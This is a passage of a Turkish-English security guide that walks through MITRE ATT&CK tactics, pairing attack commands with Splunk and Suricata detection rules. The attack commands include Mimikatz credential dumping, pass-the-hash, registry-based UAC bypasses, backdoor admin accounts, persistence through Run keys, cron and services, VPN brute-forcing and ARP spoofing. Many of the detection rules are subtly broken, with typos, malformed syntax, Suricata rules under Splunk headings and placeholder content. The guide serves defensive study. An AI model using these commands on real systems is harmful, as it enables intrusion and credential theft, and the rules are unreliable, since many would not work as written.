9. **Native API:** Saldırganların, işletim sisteminin sunduğu düşük seviyeli API'leri kullanarak zararlı yazılımlarını çalıştırmalarıdır. Bu API'ler doğrudan işletim sistemiyle etkileşimde bulunarak çeşitli işlemler gerçekleştirebilir.

#### **Command and Scripting Interpreter**

- **Attack Commands:**

- **PowerShell:**

  - **Collecting System Information:**

    ```powershell
    powershell -command "Get-WmiObject Win32_ComputerSystem"
    ```

  - **Listing Files on the System:**

    ```powershell
    powershell -command "Get-Childitem C:\Users"
    ```

- **CMD:**

  - **Collecting System Information:**

    ```cmd
    systeminfo
    ```

  - **Listing Active Connections:**

    ```cmd
    netstat -an
    ```

- **Splunk Rule**

```spl
index=windows_event _Jogs EventCode=4688 ProcessName="*powershell.exe*"
| table _time, host, ProcessName, CommandLine
```

- **Suricata Rule**

```suricata
alert http any any -> any any (msg:"Potential malicious PowerShell activity"; content:"powershell.exe"; http_uri; pcre"/command-\w+/i"; sid:100010; rev:1;)
```

#### **Windows Management Instrumentation**

- **Attack Commands:**

- **Collecting System Information with WMI:**

  ```cmd
  wmic computersystem get manufacturer, model, name, numberofprocessors, systemtype
  ```

- **Remote Command Execution with WMI:**

  ```cmd
  wmic /node:"TARGET_IP" process call create "cmd.exe /c notepad.exe"
  ```

- **Listing Active Processes with WMI:**

  ```cmd
  wmic process list
  ```

- **Splunk Rule**

- **To detect activities performed via WMI:**

  ```spl
  index=windows_event _Jogs EventCode=4688 ProcessName="*wmic.exe*"
  | table _time, host, ProcessName, CommandLine
  ```

- **To detect remote command execution activities with WMI:**

  ```spl
  index=windows_event _Jogs EventCode=4688 CommandLine="*process call create*"
  | table _time, host, CommandLine
  ```

#### **Scheduled Task**

- **Attack Commands:**

- **Creating a New Task:**

  ```cmd
  schtasks /create /tn "MaliciousTask" /tr "C:\path\to\malicious.exe" /sc daily /st 12:00
  ```

- **Listing Created Tasks:**

  ```cmd
  schtasks /query
  ```

- **Deleting a Created Task:**

  ```cmd
  schtasks /delete /tn "MaliciousTask"
  ```

- **Splunk Rule**

- **To detect schtasks command execution:**

  ```spl
  index=windows_event_logs EventCode=4688 ProcessName="*schtasks.exe*"
  | table _time, host, ProcessName, CommandLine
  ```

- **To detect the creation of potentially malicious tasks:**

  ```spl
  index=windows_event_logs EventCode=4698 OR EventCode=4699 OR EventCode=4702
  | table _time, host, TaskName, TaskContent
  ```

- **Suricata Rule**

- **To detect potential download of malicious task files:**

  ```suricata
  alert http any any -> any any (msg:"Possible download of malicious task file"; content:".task"; http_uri; sid:100013; rev:1;)
  ```

#### **Service Execution**

- **Attack Commands:**

- **Creating a New Service:**

  ```cmd
  sc create MaliciousService binPath="C:\path\to\malicious.exe"
  ```

- **Starting the Service:**

  ```cmd
  net start MaliciousService
  ```

- **Stopping the Service:**

  ```cmd
  net stop MaliciousService
  ```

- **Deleting the Created Service:**

  ```cmd
  sc delete MaliciousService
  ```

- **Splunk Rule**

- **To detect running sc or net commands:**

  ```spl
  index=windows_event_logs EventCode=4688 (ProcessName="*scexe*" OR ProcessName="*net.exe*")
  | table _time, host, ProcessName, CommandLine
  ```

- **To detect the creation or modification of new services:**

  ```spl
  index=windows_event_logs EventCode=7045 OR EventCode=7036
  | table _time, host, ServiceName, ServiceType, ServiceStartType, ServiceAccount, ImagePath
  ```

#### **Third-party Software**

- **Attack Commands:**

- **Office Macro Abuse:**

  ```vb
  Sub AutoOpen()
      Shell "cmd.exe /c malicious_command_here", vbHide
  End Sub
  ```

- **PowerShell Script Usage:**

  ```cmd
  powershell -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File C:\path\to\malicious.ps1
  ```

- **Splunk Rule**

- **To detect PowerShell running:**

  ```spl
  index=windows_event_logs EventCode=4688 ProcessName="*powershell.exe*"
  | table _time, host, ProcessName, CommandLine
  ```

- **To detect activation of Office macros:**

  ```spl
  index=windows_event_logs EventCode=1044
  | table _time, host, DocumentName, ApplicationName
  ```

#### **User Execution**

- **Attack Commands:**

- **Malicious Office Document**

- **Malicious Executable (exe, bat, etc.)**

- **Splunk Rule**

- **To detect user execution of executables or scripts:**

  ```spl
  index=windows_event_logs EventCode=4688 (ProcessName="*.exe" OR ProcessName="*.bat" OR ProcessName="*.ps1")
  | table _time, host, ProcessName, CommandLine
  ```

- **To detect activation of Office macros:**

  ```spl
  index=windows_event_logs EventCode=1044
  | table _time, host, DocumentName, ApplicationName
  ```

**Suricata Rules:**

- **To detect downloading malicious executables (.exe):**

  ```suricata
  alert http any any -> any any (msg:"Possible download of executable file"; content:"exe"; http_uri; sid:100017; rev:1;)
  ```

- **To detect downloading malicious Office documents (with macro):**

  ```suricata
  alert http any any -> any any (msg:"Possible download of Office document with macros"; content:".docm"; http_uri; sid:100018; rev:1;)
  ```

#### **Exploitation for Client Execution**

- **Attack Commands:**

- **Browser-based Vulnerability**

- **Vulnerability in PDF Reader**

- **Splunk Rule**

- **To detect abnormal or suspicious file execution activity:**

  ```spl
  index=windows_event_logs EventCode=4688
  | table _time, host, ProcessName, CommandLine
  ```

- **Monitoring malicious downloaded files or executed scripts:**

  ```spl
  index=windows_event_logs EventCode=1 (FileType="exe" OR FileType="js" OR FileType="pdf")
  | table _time, host, FileName, ProcessName, CommandLine
  ```

**Suricata Rules:**

- **To detect downloading malicious JavaScript or web content:**

  ```suricata
  alert http any any -> any any (msg:"Possible download of malicious JavaScript"; content:"js"; http_uri; sid:100019; rev:1;)
  ```

- **To detect downloading malicious PDF files:**

  ```suricata
  alert http any any -> any any (msg:"Possible download of malicious PDF"; content:".pdf"; http_uri; sid:100020; rev:1;)
  ```

### **Persistence**

Saldırganların sistemde kalıcı erişim sağlamasını sağlayan teknikleri içerir. İşte bu tekniklerin kısa açıklamaları:

1. **Account Manipulation:** Kullanıcı hesapları üzerinde değişiklikler yaparak (örneğin, yeni hesap oluşturma veya mevcut hesabın yetkilerini artırma) sistemde kalıcı erişim sağlama.

2. **Boot or Logon Autostart Execution:** Sistem başlatıldığında veya kullanıcı oturum açtığında otomatik olarak çalışan zararlı yazılımlar yerleştirerek kalıcı erişim sağlama.

3. **Create or Modify System Process:** Sistem süreçlerini yaratmak veya mevcut süreçleri değiştirmek yoluyla kötü amaçlı yazılımın çalışmasını sürdürme.

4. **Event Triggered Execution:** Belirli bir olay tetiklendiğinde (örneğin, bir dosya değişikliği veya sistemdeki bir aktivite) otomatik olarak zararlı yazılım çalıştırma.

5. **External Remote Services:** Dışarıdan erişim sağlayan uzaktan hizmetler (VPN, SSH vb.) kurarak sisteme uzaktan bağlantı kurarak kalıcı erişim sağlama.

6. **Scheduled Task/Job:** Zamanlanmış görevler aracılığıyla zararlı yazılımların belirli aralıklarla veya sistem yeniden başlatıldığında çalışmasını sağlama.

7. **Server Software Component:** Sunucu yazılımı bileşenlerini kullanarak (örneğin, web sunucuları veya veritabanı hizmetleri) kötü amaçlı yazılımın sistemde kalmasını sağlama.

#### **Account Manipulation**

- **Attack Commands:**

- **Creating an Account Using Net in Windows:**

  ```bash
  net user hackeruser hackerpassword /add
  ```

- **Adding to Account Group Using Net in Windows:**

  ```bash
  net localgroup administrators hackeruser /add
  ```

- **Creating a New User in Linux:**

  ```bash
  useradd -m hackeruser
  echo hackerpassword | passwd hackeruser --stdin
  ```

- **Adding User to sudo Group in Linux:**

  ```bash
  usermod -aG sudo hackeruser
  ```

- **Splunk Rule**

- **For Windows (Follow Event ID 4720 especially for new account creation):**

  ```spl
  index=windows_security_logs EventCode=4720 OR EventCode=4738 OR EventCode=4724
  | table _time, host, Account_Name, Account_Domain, EventCode
  ```

- **For Linux (Monitor new user creation events in system logs such as /var/log/auth.log or /var/log/secure):**

  ```spl
  index=linux_logs source="/var/log/auth.log" ("useradd" OR "passwd" OR "usermod")
  | table _time, host, log_message
  ```

#### **Boot or Logon Autostart Execution**

- **Attack Commands:**

- **Setting the Start of Login with Registry on Windows:**

  ```bash
  REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousProgram /t REG_SZ /d "C\path\to\malicious.exe"
  ```

- **Setting the Start of Logon with the Task Scheduler in Windows:**

  ```bash
  schtasks /create /tn "MaliciousTask" /en "C\path\to\malicious.exe" /sc onlogon
  ```

- **Setting Login Startup with cron on Linux:**

  ```bash
  echo "reboot /path/to/malicious_script.sh" >> /var/spool/cron/crontabs/root
  ```

- **Splunk Rule**

- **For Windows Registry Changes:**

  ```spl
  index=windows_event_logs EventCode=4688
  | search CommandLine="*HKCU\ (Software\ \Microsoft\ | Windows | \CurrentVersion | (Run*" OR CommandLine="*schtasks /create*"
  | table _time, host, Account_Name, CommandLine
  ```

- **Monitoring cron changes for Linux:**

  ```spl
  index=linux_logs source="/var/log/syslog"
  | search msa="*CRON*CMD*" AND (msa="*malicious_script.sh*" OR msa="*@reboot*")
  | table _time, host, msg
  ```

#### **Create or Modify System Process**

- **Attack Commands:**

- **Creating a New Service in Windows:**

  ```bash
  sc create MaliciousService binPath="C:\path\to\malicious.exe" start=auto
  ```

- **Starting the Created Service:**

  ```bash
  sc start MaliciousService
  ```

- **Splunk Rule**

- **To Monitor Newly Created or Modified Windows Services:**

  ```spl
  index=windows_event_logs EventCode=7045 OR EventCode=4697
  | search Service_Name="MaliciousService" OR Service_File_Name="*malicious.exe"
  | table _time, host, Service_Name, Service_File_Name
  ```

- **To Detect a Remote Service Creation or Modification Activity Over the SMB Protocol:**

  ```suricata
  alert tcp any any -> $HOME_NET 445 (msg:"Possible SMB Service Modification or Creation"; flowto_server, established; content:"sc create"; depth:20; sid:1002001; rev:1;)
  ```

#### **Event Triggered Execution**

- **Attack Commands:**

- **Running a Task with an Event Log Event Triggered:**

  (Ayrıntılar verilmediği için bu komut daha spesifik hale getirilebilir.)

Splunk Rule

- **To Monitor Scheduled Task Creation or Modification:**

  ```spl
  index=windows_event_logs EventCode=4698 OR EventCode=4699 OR EventCode=4702
  | table _time, host, TaskName, TaskContent
  ```

- **Splunk Rule**

- **To Detect an Activity Performing Remote Task Scheduler Operations Over RDP:**

  ```suricata
  alert tcp any any -> $HOME_NET 3389 (msg:"Possible RDP Scheduled Task Activity"; flowto_server, established; content:"specific byte patterns for task scheduling over RDP"; sid:1003001; rev:1;)
  ```

#### **External Remote Services (Persistence)**

- **Attack Commands:**

- **Brute-Force Attack on OpenVPN:**

  ```bash
  nmap -p 1194 --script openvpn-brute --script-args userdb=user.txt,passdb=pass.txt <TARGET_IP>
  ```

- **Splunk Rule**

- **To Monitor Failed Login Attempts in OpenVPN Logs:**

  ```spl
  index=openvpn_logs message="AUTH: Received control message: AUTH_FAILED"
  | table _time, host, src_ip, user
  ```

- **Splunk Rule**

- **To Detect Potential Brute-Force Attacks Against OpenVPN Server:**

  ```suricata
  alert tcp any any -> $HOME_NET 1194 (msg:"Potential Brute-Force on OpenVPN"; flowto_server, established; content:"AUTH_FAILED"; threshold type both, track by_src, count 5, seconds 60; sid:1004001; rev:1;)
  ```

#### **Scheduled Task/Job**

- **Attack Commands:**

- **Task Scheduling in Windows:**

  ```bash
  schtasks /create /tn "MaliciousTask" /tr "C:\path\to\malicious\script.bat" /sc daily /st 12:00
  ```

- **Creating a Cron Job in Linux:**

  ```bash
  echo "* * * * * /path/to/malicious/script.sh" >> /etc/crontab
  ```

- **Splunk Rule**

- **To Monitor Scheduled Tasks Created or Modified in Windows:**

  ```spl
  index=windows_event_logs EventCode=4698 OR EventCode=4699 OR EventCode=4702
  | table _time, host, TaskName, TaskContent
  ```

- **To Monitor Cron Processes on Linux:**

  ```spl
  index=linux_logs sourcetype=syslog cron OR sourcetype=linux_audit type=CONFIG_CHANGE
  | table _time, host, msg
  ```

- **Splunk Rule**

- **To Detect Task Scheduling over RDP:**

  ```suricata
  alert tcp any any -> $HOME_NET (3389) (msg:"Possible RDP Scheduled Task Activity"; flowto_server, established; content:"specific byte patterns for task scheduling over RDP"; sid:1005001; rev:1;)
  ```

### **Privilege Escalation**

Saldırganların mevcut sistem izinleriyle sınırlı kalmayıp, daha yüksek ayrıcalıklara erişim sağlamak amacıyla kullandığı teknikleri içerir. İşte açıklamalar:

1. **Access Token Manipulation:** Saldırganlar, mevcut erişim tokenlarını değiştirerek, kendilerine yüksek yetkiler (admin veya sistem erişimi gibi) sağlayabilir. Bu, token çalma veya manipülasyon yoluyla gerçekleştirilir.

2. **Bypass User Account Control (UAC):** Windows işletim sistemlerinde, kullanıcı hesap denetimini (UAC) atlatmak amacıyla çeşitli teknikler kullanarak, düşük ayrıcalıklı kullanıcıların yüksek yetkilere sahip işlemleri çalıştırmasını sağlamak.

3. **Exploitation for Privilege Escalation:** Sistem açıklarını kullanarak veya yazılım hatalarından yararlanarak, saldırganların mevcut düşük seviyeli erişimlerini daha yüksek ayrıcalıklara yükseltmeleridir. Bu, işletim sistemi zayıflıklarını veya uygulama hatalarını hedef alabilir.

4. **File and Directory Permissions Modification:** Dosya ve dizin izinlerini değiştirerek, saldırganlar bu dosyalar üzerinde daha fazla kontrol elde edebilir. Örneğin, kritik dosyaların okuma/yazma izinlerini değiştirerek daha yüksek yetkiler kazanabilirler.

5. **Sudo and Sudo Caching:** Linux ve Unix sistemlerinde, `sudo` komutunu kullanarak yönetici ayrıcalıkları elde etmek. Ayrıca, sudo'nun şifre önbellekleme özelliğinden yararlanarak, şifre istenmeden yönetici haklarıyla komut çalıştırılabilir.

#### **Horizontal Privilege Escalation**  

**Attack Commands**  
**Pass-the-Hash Attack**

Komut:

```plaintext
mimikatz # sekurlsa:pth /user:Administrator /domain:TARGETDOMAIN /ntlm:HASHVALUE /run:cmd.exe
```

- **Splunk Rule**

```spl
index=windows_security EventCode=4625 
| stats count by src_ip, dest_ip 
| where count > 10 
| join type=inner src_ip [ search index=windows_security EventCode=4624 ] 
| table src_ip, dest_ip
```

- **Suricata Rule**

```plaintext
alert tcp any any -> any 445 (msg:"Possible Pass-the-Hash detected"; flow:to_server; content:"|00 01 00 00 00|"; depth:5; sid:1000001;)
```

#### **Vertical Privilege Escalation**  

- **Attack Commands**

##### **Windows UAC Bypass**

Komut:  

```plaintext
fodhelper.exe -k cmd -c "cmd /c start cmd.exe"
```

- **Splunk Rule**

```spl
index=windows EventCode=4688 
Image="C:\\Windows\\System32\\fodhelper.exe" 
CommandLine="*cmd*"
```

- **Suricata Rule**

Suricata için bir kural önerisi aşağıdaki gibi olabilir:

```plaintext
alert tcp any any -> any any (msg:"Possible UAC Bypass attempt via fodhelper.exe"; flow:to_server; content:"fodhelper.exe"; nocase; depth:50; sid:1000002;)
```

### **Defense Evasion**  

1. **Obfuscated Files or Information:** Bilgi veya dosyaların karmaşık hale getirilmesiyle algılama engellenir.  
2. **Deobfuscate/Decode Files or Information:** Şifrelenmiş veya gizlenmiş bilgilerin çözümlenmesi.  
3. **Modify Registry:** Kayıt defterinin değiştirilmesiyle zararlı davranışlar gizlenir.  
4. **Bypass User Account Control:** UAC mekanizmasını atlayarak yetkiler yükseltilir.  
5. **Disabling Security Tools:** Güvenlik araçlarının etkisiz hale getirilmesi.  
6. **Indicator Removal on Host:** İz bırakmadan zararlı faaliyetlerin silinmesi.  
7. **Network Share Connection Removal:** Ağ paylaşım bağlantılarının kesilerek iz takibi zorlaştırılır.

#### **Obfuscated Files or Information**

- **Attack Commands**

  **a. Base64 Encoding:**

  ```bash
  echo "This is a secret message." | base64
  ```  

  **b. PowerShell ile String Obfuskasyonu:**

  ```powershell
  # EncodedCommand: Base64 olarak kodlanan bir PowerShell komutu  
  $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Write-Host "Hello World"'))  
  powershell -EncodedCommand $EncodedCommand
  ```

- **Splunk Rule**

```spl
index=your_index sourcetype=your_sourcetype 
| regex _raw="*[a-zA-Z0-9/+]{30,}={0,2}$" 
| table _time, host, user, _raw
```

- **Suricata Rule**

```plaintext
alert http any any -> any any (msg:"Possible Base64 encoded data detected"; content:"|2F 2F|"; depth:2; pcre:"/[a-zA-Z0-9\/+]{30,}={0,2}$/"; sid:1000001;)
```

#### **Modify Registry**

- **Attack Commands**

  **a. Creating the Registry Key:**

  ```powershell
  New-Item -Path 'HKCU:\Software\ExampleKey'
  ```  

  **b. Setting Registry Value:**

  ```powershell
  Set-ItemProperty -Path 'HKCU:\Software\ExampleKey' -Name 'NewValueName' -Value 'TestData'
  ```  

  **c. Modifying the Registry with the `reg` Tool:**

  ```bash
  reg add HKCU\Software\ExampleKey /v NewValueName /t REG_SZ /d TestData
  ```

- **Splunk Rule**

```spl
index=win_eventlog EventCode=4657 
| table _time, ComputerName, ObjectName, OldValue, NewValue
```

- **Suricata Rule**

```plaintext
alert http any any -> any 80 (msg:"Possible malicious file download"; fileext:"exe"; sid:1000002;)
```

#### **Bypass User Account Control**

- **Attack Commands**

  **a. Bypassing UAC with fodhelper.exe:**

  ```bash
  reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f  
  reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f  
  start fodhelper.exe
  ```  

  **b. Bypassing UAC with sdclt.exe:**

  ```bash
  reg add HKCU\Software\Classes\exefile\shell\open\command /v DelegateExecute /f  
  reg add HKCU\Software\Classes\exefile\shell\open\command /d "cmd.exe" /f  
  sdclt.exe
  ```

- **Splunk Rule**

```spl
index=win_eventlog EventCode=4657 
(ObjectName="HKCU\Software\Classes\ms-settings\shell\open\command" OR 
 ObjectName="HKCU\Software\Classes\exefile\shell\open\command") 
| table _time, ComputerName, ObjectName, OldValue, NewValue
```

- **Suricata Rule**

```plaintext
alert http any any -> any 80 (msg:"Possible UAC Bypass tool download"; fileext:"exe"; sid:1000003;)
```

### **Credential Access**  

1. **Brute Force (Zorla Şifre Deneme):** Sistematik olarak tüm olası şifre kombinasyonlarını deneyerek yetkilendirme bilgilerini ele geçirme yöntemidir.  
2. **Credential Dumping (Kimlik Bilgisi Çıkarma):** Hafıza, dosya sistemi veya sistem kayıt defterinden kimlik bilgilerini toplama tekniğidir.  
3. **Man-in-the-Middle (Ortadaki Adam Saldırısı):** İki taraf arasındaki iletişimi gizlice izleme, değiştirme veya yönlendirme saldırısıdır.  
4. **Password Filter DLL (Şifre Filtresi DLL):** Windows şifre değişikliği işlemini hedef alarak kimlik bilgilerini çalmak için kullanılan zararlı DLL dosyası yerleştirme yöntemidir.  
5. **Password Spraying (Şifre Yağmurlaması):** Çok sayıda kullanıcı hesabında yaygın olarak kullanılan şifreleri deneme yöntemidir.  
6. **Securityd Memory (Securityd Bellek):** macOS sistemlerinde kimlik bilgilerini ele geçirmek için güvenlikd (securityd) sürecinin belleğini hedef alan saldırılardır.  

#### **Credential Dumping**

- **Attack Commands**

**a. Example of dumping credentials with Mimikatz:**  

```plaintext
mimikatz # privilege::debug  
mimikatz # sekurlsa::logonpasswords
```

**1. Splunk Rule:**

```plaintext
index=your_index_name EventCode=10 CallTrace="*mimikatz*"
```

**2. Suricata Rule:**

```plaintext
alert tcp any any -> $HOME_NET any (msg:"Possible Mimikatz Activity"; content:"mimikatz"; nocase; classtype:bad-unknown; sid:1000001; rev:1;)
```

#### **Man-in-the-Middle (MitM)**  

- **Attack Commands**

**Example of ARP Spoofing:**

```plaintext
ettercap -T -M arpremote /target1_IP/ /target2_IP/
```

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=network sourcetype=arp_logs  
| stats count by src_ip, src_mac  
| where count > 10  
| sort -count
```  

**2. Suricata Rule:**

```plaintext
alert arp any any -> any any (msg:"Possible ARP Spoofing Detected"; arp_resp; content:"|00 01 08 00 06 04 00 02|"; threshold type both, track by_src, count 10, seconds 60; sid:1234567;)
```

#### **Password Filter DLL**  

- **Attack Commands**  

1. **Create a Password Filter DLL:**  
   - DLL, aşağıdaki üç işlevi içermelidir:  
     - `InitializeChangeNotify`  
     - `PasswordFilter`  
     - `PasswordChangeNotify`  

2. **Install the DLL:**  
   - DLL, hedef makinede uygun bir konuma yerleştirilir.  

3. **Modify the Registry:**  
   - DLL'nin yolu, şu kayıt defterine eklenir:

     ```plaintext
     HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages
     ```

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=windows sourcetype=WinRegistry  
| search Registry_key_path="*\(SYSTEM\|CurrentControlSet\)\Control\Lsa\Notification Packages*"  
| stats count by Registry_key_path, Registry_data
```

**2. Suricata Rule:**

```plaintext
alert tcp any any -> $HOME_NET 445 (msg:"Potential Password Filter DLL Activity";  
flow:to_server,established;  
content:"|HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages|";  
sid:1234569;)
```

#### **Securityd Memory**  

- **Attack Commands**  

**Example Command to Dump Securityd Memory:**

```bash
gcore $(pgrep securityd)
```

- **Detection Rules**  

  **1. Splunk Rule:**

  ```plaintext
  index=macos_logs sourcetype=bash_history "gcore"
  ```

  **2. Suricata Rule:**

  ```plaintext
  alert tcp any any -> $HOME_NET any (msg:"Potential Securityd Memory Dump Activity";  
  content:"gcore"; nocase;  
  flow:to_server,established;  
  sid:1234570;)
  ```

### **Discovery**  

1. **Account Discovery (Hesap Keşfi):** Sistem üzerindeki kullanıcı hesaplarını tespit etmek için yapılan keşif faaliyetleridir.  
2. **Browser Bookmark Discovery (Tarayıcı Yer İmi Keşfi):** Tarayıcı yer imlerini toplayarak kullanıcının sık ziyaret ettiği siteleri keşfetme yöntemidir.  
3. **Cloud Service Discovery (Bulut Hizmeti Keşfi):** Hedefin kullandığı bulut hizmetlerini ve yapılandırmalarını tespit etme faaliyetleridir.  
4. **Domain Trust Discovery (Etki Alanı Güven Keşfi):** Etki alanları arasındaki güven ilişkilerini keşfederek saldırıyı genişletme yöntemidir.  
5. **File and Directory Discovery (Dosya ve Dizin Keşfi):** Sistemdeki önemli dosya ve dizinleri belirlemek için yapılan taramalardır.  
6. **Network Service Scanning (Ağ Hizmeti Taraması):** Açık portlar ve ağ hizmetlerini keşfetmek için ağ üzerinde yapılan taramalardır.  
7. **Password Policy Discovery (Şifre Politikası Keşfi):** Sistemin şifre politikalarını tespit ederek saldırıyı planlama yöntemidir.  
8. **Peripheral Device Discovery (Çevresel Aygıt Keşfi):** Sisteme bağlı çevresel aygıtları (USB, yazıcı, vb.) keşfetme faaliyetleridir.  
9. **Process Discovery (Süreç Keşfi):** Çalışan süreçleri ve hizmetleri tespit ederek hedefin sistem durumunu anlama yöntemidir.  
10. **Remote System Discovery (Uzaktan Sistem Keşfi):** Ağ üzerindeki diğer sistemleri tespit ederek olası hedefleri belirleme yöntemidir.  
11. **Software Discovery (Yazılım Keşfi):** Hedef sistemde yüklü olan yazılımları keşfetme faaliyetleridir.  
12. **System Information Discovery (Sistem Bilgisi Keşfi):** İşletim sistemi, yama durumu ve diğer sistem bilgilerini toplama yöntemidir.  
13. **System Network Configuration Discovery (Sistem Ağ Yapılandırma Keşfi):** Ağ yapılandırması, IP adresleri ve yönlendirme bilgilerini tespit etme faaliyetleridir.  
14. **System Network Connections Discovery (Sistem Ağ Bağlantıları Keşfi):** Sistem üzerindeki aktif ağ bağlantılarını tespit ederek iletişim bilgilerini anlama yöntemidir.  
15. **System Owner/User Discovery (Sistem Sahibi/Kullanıcı Keşfi):** Sistemi kullanan ya da sahibi olan kullanıcıları tespit etme faaliyetleridir.  
16. **System Time Discovery (Sistem Zamanı Keşfi):** Sistem tarih ve saat bilgilerini keşfederek saldırı zamanlaması yapma yöntemidir.  

#### **Account Discovery**

- **Attack Commands**  

**Examples in Windows Environment:**

1. `net user`  
2. `net user /domain`  
3. `net group "domain admins" /domain`  
4. `whoami /all`  
5. `net group /domain`  

- **Detection Rules**

  **1. Splunk Rule:**

  ```plaintext
  index=winseclog EventCode=4688 (CommandLine="*net user*" OR CommandLine="*whoami /all*")
  ```  

  **2. Suricata Rule:**

  ```plaintext
  alert tcp any any -> $HOME_NET 445 (msg:"Potential Account Discovery Activity";  
  content:"net user"; nocase;  
  content:"whoami /all"; nocase;  
  sid:1234571;)
  ```

#### **File and Directory Discovery**  

- **Attack Commands**  

**Examples in Windows Environment:**

1. `dir C:\`  
2. `tree C:\`  
3. `findstr /s /i "password" *.*`  
4. `Get-ChildItem -Path C:\ -Recurse`  

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=winseclog EventCode=4688 (CommandLine="*dir C:\\*" OR CommandLine="*tree C:\\*" OR CommandLine="*findstr /s /i*")
```  

**2. Suricata Rule:**

```plaintext
alert tcp any any -> $HOME_NET any (msg:"Potential File and Directory Discovery Activity";  
content:"dir C:\\"; nocase;  
content:"tree C:\\"; nocase;  
content:"findstr /s /i"; nocase;  
sid:1234572;)
```

#### **Process Discovery**  

- **Attack Commands**  

**Examples in Windows Environment:**

1. `tasklist`  
2. `ps`  
3. `Get-Process`  
4. `wmic process`  

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=winseclog EventCode=4688 (CommandLine="*tasklist*" OR CommandLine="*ps*" OR CommandLine="*Get-Process*" OR CommandLine="*wmic process*")
```  

**2. Suricata Rule:**

```plaintext
alert tcp any any -> $HOME_NET any (msg:"Potential Process Discovery Activity";  
content:"tasklist"; nocase;  
content:"ps"; nocase;  
content:"Get-Process"; nocase;  
content:"wmic process"; nocase;  
sid:1234573;)
```

### **Lateral Movement**  

1. **Pass the Hash (Pth):** Kullanıcının şifre hash'ini çalarak kimlik doğrulama sağlamak.  
2. **Remote Desktop Protocol (RDP):** Uzaktan masaüstü bağlantısı ile hedef sisteme erişim sağlamak.  
3. **SSH Hijacking:** Mevcut bir SSH oturumunu ele geçirerek sisteme yetkisiz erişim sağlamak.  
4. **Windows Admin Shares:** Yönetici paylaşımlarını kullanarak ağdaki diğer sistemlere erişim sağlamak.  
5. **Taint Shared Content:** Ortak kullanılan dosya veya içeriklere kötü amaçlı yazılım yerleştirmek.  
6. **Use Alternate Authentication Material:** Geleneksel kimlik doğrulama yöntemleri dışında farklı materyallerle erişim sağlamak.  

#### **Pass the Hash**  

- **Attack Commands**

1. `mimikatz # sekurlsa:logonPasswords`  
   - Mimikatz aracı ile sistemdeki oturum bilgilerini (şifre hash'lerini) çıkarma komutu.  

2. `psexec \\target_machine -u USERNAME -p [HASH] cmd`  
   - `psexec` aracı kullanılarak, hedef makinaya bir şifre hash'i ile bağlantı kurulup komut satırı açılır.  

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=windows_security EventCode=4624 LogonType=3
| stats count by Account_Name, Workstation_Name, Source_Network_Address
| where count > 5

```

- Bu kural, uzak ağ üzerinden aynı hesapla birden fazla giriş yapılmasını tespit eder.  

**2. Suricata Rule:**

```plaintext
alert smb any any -> any 445 (msg:"Possible Pass The Hash Activity"; 
flow:to_server,established;
content:"|35 00 38 00 32 00 34|"; 
classtype:suspicious-login; sid:1234567;)
```

- Suricata, SMB trafiğinde Pass the Hash tekniğine dair izler arar ve bu tür aktiviteleri tespit eder.

#### **SSH Hijacking**  

- **Attack Commands**

1. `echo $SSH_AUTH_SOCK`  
   - SSH oturumunun soket dosyasını görüntüleme komutu. Bu komut, saldırganın mevcut SSH oturumları üzerinde kimlik doğrulaması yapmasına yardımcı olabilir.  

2. `ssh -A [target_username]@[target_machine]`  
   - SSH Agent Forwarding kullanarak hedef makineye SSH ile bağlanmak. Bu komut, saldırganın hedef sistemdeki diğer makinelerde kimlik doğrulaması yapmasına olanak tanır.  

- **Detection Rules**  

**1. Splunk Rule:**

```plaintext
index=linux_logs source="/var/log/auth.log" (sshd AND (accepted OR failed)) 
| stats count by user, src_ip, action
| where count > 10
```

- Bu kural, SSH bağlantılarının sıklığını analiz eder ve aynı kullanıcıdan veya IP'den gelen çok sayıda kabul edilen veya başarısız giriş tespit edilirse alarm verir.  

**2. Suricata Rule:**

```plaintext
alert tcp any any -> any 22 (msg:"Unusual SSH traffic"; 
flags:PA; 
content:"SSH-2.0"; depth:20; 
sid:2345681;)
```

- Suricata, SSH trafiğini inceleyerek, olağandışı SSH bağlantılarını tespit eder. Özellikle belirli bayraklar veya protokol mesajlarını içeriyor ise alarm verir.

### **Collection**  

1. **Audio Capture:** Sesli iletişimi kaydetme amacıyla mikrofon veya benzeri cihazların kullanılması.  

2. **Automated Collection:** Verilerin otomatik olarak toplanması, genellikle scriptler veya araçlar kullanılarak yapılır.  

3. **Clipboard Data:** Panoya (clipboard) kopyalanan verilerin toplanması. Bu, özellikle hassas veriler için bir tehdit oluşturabilir.  

4. **Data from Information Repositories:** Veritabanları veya diğer bilgi depolarından veri toplama.  

5. **Data from Local System:** Hedef bilgisayarın yerel sisteminden veri toplama. Bu, dosyalar veya sistem ayarlarını içerir.  

6. **Data from Network Shared Drive:** Ağ üzerindeki paylaşılan sürücülerden veri toplama.  

7. **Data from Removable Media:** USB bellek veya harici sabit disk gibi çıkarılabilir medya cihazlarından veri toplama.  

8. **Email Collection:** E-posta hesaplarından veya e-posta sunucularından veri toplama.  

9. **Input Capture:** Kullanıcı girdi verilerini (örneğin, tuş vuruşlarını) izleme ve toplama.  

10. **Man in the Middle (MitM):** İletişim kanalındaki iki taraf arasında gizlice veri yakalama ve manipüle etme.  

11. **Screen Capture:** Hedef bilgisayarın ekranını görüntüleyerek bilgi toplama.  

12. **Video Capture:** Hedef bilgisayarın ekranındaki görüntüleri video olarak kaydetme.

### **Exfiltration**  

1. **Automated Exfiltration:**  
   - Verilerin otomatik olarak hedef sistemden dışarıya çıkarılması. Genellikle scriptler veya otomatik araçlar kullanılır.  

2. **Data Compressed:**  
   - Veri sıkıştırılarak, daha hızlı ve daha küçük boyutlu bir şekilde dışarıya aktarılır. Bu, exfiltrasyon sırasında veri miktarını azaltmak için kullanılır.  

3. **Data Encrypted:**  
